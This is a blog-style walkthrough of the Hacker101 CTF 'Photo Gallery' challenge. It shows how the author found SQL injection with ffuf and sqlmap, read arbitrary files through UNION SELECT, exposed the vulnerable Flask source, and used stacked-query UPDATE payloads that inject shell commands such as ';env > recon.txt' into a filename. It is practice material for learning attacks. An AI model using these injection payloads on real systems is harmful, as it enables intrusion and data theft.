---
title: Photo Gallery walkthrough
date: "2022-10-16T09:30:00.284Z"
description: "Writeup for the Hacker101 CTF challenge Photo Gallery"
---

This is the next challenge from [Hacker101 CTF](https://ctf.hacker101.com/) after `Encrypted Pastebin`. This is a web challenge rated as moderate. Let's dive right into it.

## Recon

 The homepage displays three images, but the last one doesn't render correctly. The first thing I tend to do when using a new service is to understand on a higher level how it works. Let's inspect the source code and the network calls made by the page.

In our network tab we notice calls to the endpoint `/fetch=<id>`. It's also interesting that the id with value `3` causes an Internal Server error while ids `1` and `2` are fine. Let's keep that in mind since the service might be vulnerable to an IDOR or SQLi.

In order to find hidden ids I like to use [ffuf](https://github.com/ffuf/ffuf) to fuzz values.  Let's create a `range.txt` file with 50 ids and feed those to `ffuf`.

```bash
$ range 50 > range.txt
$ ffuf -w range.txt --mc "all" -u https://<subdomain>.ctf.hacker101.com/fetch?id=FUZZ
...
```

Nothing stands out here, only the first two images returns status `200`. In this case I used `--mc "all"` to display every response irrespective of status code since I wanted to see if we could find other ids that would give us an Internal Server Error, but we couldn't find any other one besides `3`, which we already knew about.

Sometimes endpoints respond to other HTTP methods besides the usual `GET`, is that the case here? Let's try to see if our endpoint responds to a `POST` request.


```bash
$ curl -X POST https://<subdomain>.ctf.hacker101.com/fetch
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Seems like it doesn't. Maybe we should try to discover more endpoints in this service. Let's use `ffuf` yet again with a different wordlist.

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<subdomain>.ctf.hacker101.com/FUZZ
...
```

No interesting results yet again! At this point my idea is to find out if we can abuse the `id` query parameter in any way. Passing the value `foo` to it generates a `500` (internal server error), which is interesting. Passing `"foo"` returns a `404` status code.

At this point I'm convinced our input is causing some kind of internal query (hopefully SQL) to error out, but we don't have access to the output. Passing `"1"` instead of `1` makes the server return something interesting:

```bash
����JFIF�����ExifMM*JR(1Z�ih��paint.net 4.1��zzUNICODECREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90 ��C  #,%!*!&4'*./121%6:60:,010��C  0  00000000000000000000000000000000000000000000000000����"�� ���}!1AQa"q2���#B��R��$3br�
...
```

Passing `"2"` also returns a similar output, but passing something like `"100"` returns a not found status. I'm convinced that we can exploit this somehow, so let's turn to `sqlmap` to try all sorts of techniques for us.

## SQL Injection

```bash
$ sqlmap -u https://<subdomain>.ctf.hacker101.com/login?id=1 -p "id" --dump
...
[18:23:58] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable 
...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 312 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9950=9950

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: id=1 OR SLEEP(5)
---
[18:26:52] [INFO] the back-end DBMS is MySQL
```

And as we thought that endpoint was vulnerable to SQL injection! Here's the dump of the database:

```bash
Database: level5
Table: albums
[1 entry]
+----+---------+
| id | title   |
+----+---------+
| 1  | Kittens |
+----+---------+

Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | <flag> |
+----+------------------+--------+------------------------------------------------------------------+
```

Now we know the tables and columns and we can have an idea of how the server works. I would bet the query triggered from `/fetch?id=<id>` is something like:

```sql
SELECT filename FROM photos where id = <id>; 
```

This implies that the server loads whatever filename it gets from the database and sends it back to the client. Can we load other files besides our images? Let's keep this in mind after investigating the third entry in the `photos` table.

The query to `id` number `3` returns `500` because that file seems to be missing. Lucky for us that missing file is our first flag!

## Arbitrary file loading

Let's get back to our hypothesis that we can load files from our server. Would it be possible to load any file using a query like the one below?

```sql
SELECT filename FROM photos where id = 4 UNION SELECT '<our file>'; 
```

Let's try it with `files/adorable.jpg ` since we know this file exists. I'm also using `id` as `4` because we know this `id` doesn't exist in our table.

```sql
https://<subdomain>.ctf.hacker101.com/fetch?id=4 UNION SELECT 'files/adorable.jpg'; --
```

And we got our status `200` answer as expected! The only problem is that we don't know how the files in our application are named. 

At this point I got a bit lost and had to get hints for this challenge, the one that helped me the most was:

```bash
This application runs on the uwsgi-nginx-flask-docker image
```

Which pointed me to: [https://github.com/tiangolo/uwsgi-nginx-flask-docker](https://github.com/tiangolo/uwsgi-nginx-flask-docker). 

According to this docker image we are running python and we usually have an `app` directory with files named:
* `uwsgi.ini`
* `main.py`

So I started querying for `main.py`  we get the file:

```
https://<subdomain>.ctf.hacker101.com/fetch?id=?id=4 UNION SELECT 'main.py'; --
```

And inspecting the source code of the page allow us to read the contents of our `main.py` file:

```python
from flask import Flask, abort, redirect, request, Response
import base64, json, MySQLdb, os, re, subprocess
app = Flask(__name__)
home = '''
<!doctype html>
<html>
	<head>
		<title>Magical Image Gallery</title>
	</head>
	<body>
		<h1>Magical Image Gallery</h1>
$ALBUMS$
	</body>
</html>
'''
viewAlbum = '''
<!doctype html>
<html>
	<head>
		<title>$TITLE$ -- Magical Image Gallery</title>
	</head>
	<body>
		<h1>$TITLE$</h1>
$GALLERY$
	</body>
</html>
'''
def getDb():
	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")
def sanitize(data):
	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())
	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="[fetch?id=%i](view-source:https://67d88c594684dc2c38c7880002121440.ctf.hacker101.com/fetch?id=%i)" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'
	return home.replace('$ALBUMS$', rep)
@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)
	# It's dangerous to go alone, take this:
	# ^FLAG^...$FLAG$
	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
if __name__ == "__main__":
	app.run(host='0.0.0.0', port=80)
```

And we get another flag!

```python
# It's dangerous to go alone, take this:
# ^FLAG^...$FLAG$
```

Besides that a few other things stand out in this source code.

### subprocess

The `subprocess.check_output` method accepts our filenames without any encoding or sanitization. If we can somehow overwrite a filename in the database we should be able to get remote code execution.

```python
subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT)
```

Our plan is to do something like:

```bash
du -ch filenames; <our command> || exit 0
```

So we need to have a file named `; <our command>` as the **last one** in the list.

### Database query in the fetch endpoint

Our query for a `photo` has the following format:

```sql
if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0
```

We already know our query is vulnerable to SQL injection and that we are using MySQL from our source code. MySQL also has a concept called stacked queries that allows us to send multiple queries to our database at the same time. If this is enabled we can inject whatever filename we want and cause remote code execution.

I would like to stop here and say that finding this wasn't straightforward at all and required a lot of research on potential ways to exploit MySQL through SQL injection.

Let's validate this approach with an `id` like:

```sql
1; INSERT INTO photos (id, title, parent, filename) VALUES (4, 'Potato', 1, 'files/adorable.jpg');
```

This will:

1. Query for the `id=1` which we know exists
2. INSERT a new value in our database with a file that we know exists

There's one trick to this though, we need to `commit` the value to our database. By default this doesn't happen as we can see in [this example](https://dev.mysql.com/doc/connector-python/en/connector-python-example-cursor-transaction.html).

So let's modify our payload above:

```sql
1; INSERT INTO photos (id, title, parent, filename) VALUES (4, 'Potato', 1, 'files/adorable.jpg'); commit;
```

And now querying with `/fetch?id=4` returns our image!

It's time to get remote code execution (RCE). Or so I though... Going back to the homepage did not display my new photo. Going back to the source code to understand why made me notice the `LIMIT 3` in the query below:

```python
cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'
```

I guess we need to update one of our records with the value we want instead of creating a new one. Or delete the existing ones, any solution is a valid one. Let's go with the `UPDATE` one and do some recon on the file system:

```sql
1; UPDATE photos SET filename=";ls > recon.txt" where id=3; commit;
```

Now we can go back and refresh the homepage so the `'du -ch <files>; <our command> || exit 0'` command is executed and then we can read our new file with:

```sql
?id=6 UNION SELECT 'recon.txt';
```

we get:

```bash
Dockerfile files main.py main.pyc prestart.sh recon.txt requirements.txt uwsgi.ini
```

Let's investigate these other files! After going over these one by one, the one that gave me an idea was `prestart.sh` since it contains the contents:

```bash
#!/bin/bash set -e service mysql start & python setup.py rm setup.py
```

Could this `setup.py` be adding something to our environment? Let's validate this by adding the contents our environment to our `recon.txt` file with the `env` command:

```sql
1; UPDATE photos SET filename=";env > recon.txt" where id=3; commit;
```

And reading this file gives us our last flag, and all the other ones!

```bash
...
FLAGS=["^FLAG^...$FLAG$","^FLAG^...$FLAG$","^FLAG^...$FLAG$"]
...
```

## Conclusion

This was a fun challenge that forced us to read source code and also use and learn a bunch about SQL and MySQL features. Thinking back, instead of getting a hint we could have tried to enumerate our server for common files like `README.md`, `Dockerfile`, `main.py`, `Procfile` and so on until we found a hit. Let's keep it in mind for future sessions.

Thanks for reading and I will see you in our next challenge!